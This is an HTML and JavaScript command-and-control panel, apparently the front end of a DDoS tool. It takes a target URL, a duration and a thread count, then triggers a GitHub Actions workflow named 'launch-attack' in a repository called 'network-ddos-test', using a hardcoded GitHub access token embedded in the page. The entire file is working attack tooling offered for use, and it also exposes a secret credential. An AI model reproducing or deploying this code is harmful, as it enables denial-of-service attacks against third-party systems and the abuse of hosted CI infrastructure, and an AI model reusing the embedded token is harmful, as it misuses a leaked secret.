<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>⚡ C2 FIRE CONTROL</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        input, button { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 5px; font-family: monospace; }
        button { cursor: pointer; font-weight: bold; }
        button:hover { background: #0f0; color: #000; }
        #log { background: #000; border: 1px solid #0f0; height: 400px; overflow-y: auto; padding: 10px; margin-top: 20px; }
        .error { color: #f44; }
        .success { color: #0f0; }
        input { width: 300px; }
    </style>
</head>
<body>
    <h1>🔥 EDGE C2 COMMANDER v7.0</h1>
    <div>
        <input type="text" id="target" placeholder="http://target:port" value="http://" size="50">
        <input type="number" id="duration" placeholder="초" value="30" size="10">
        <input type="number" id="threads" placeholder="쓰레드" value="1000" size="10">
        <button onclick="startAttack()">💣 MISSION START</button>
    </div>
    <div id="log">>> SYSTEM READY. TARGET INPUT REQUIRED.\n</div>

    <script>
        const GITHUB_TOKEN = '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';
        const REPO_OWNER = 'hahahghshaha-svg';
        const REPO_NAME = 'network-ddos-test';

        function log(msg, isError = false) {
            const logDiv = document.getElementById('log');
            const div = document.createElement('div');
            div.className = isError ? 'error' : 'success';
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(div);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = document.getElementById('duration').value;
            const threads = document.getElementById('threads').value;

            if (!target || target === 'http://') {
                log('❌ TARGET REQUIRED', true);
                return;
            }

            log(`🚀 LAUNCHING: ${target} | ${duration}s | ${threads} threads`);

            try {
                const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/dispatches`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        event_type: 'launch-attack',
                        client_payload: {
                            target: target,
                            duration: parseInt(duration),
                            threads: parseInt(threads)
                        }
                    })
                });

                if (response.ok) {
                    log('✅ MISSION DISPATCHED!');
                    log('📊 CHECK: https://github.com/' + REPO_OWNER + '/' + REPO_NAME + '/actions');
                } else {
                    const error = await response.json();
                    log(`❌ ERROR ${response.status}: ${error.message}`, true);
                }
            } catch (err) {
                log(`❌ NETWORK ERROR: ${err.message}`, true);
            }
        }
    </script>
</body>
</html>
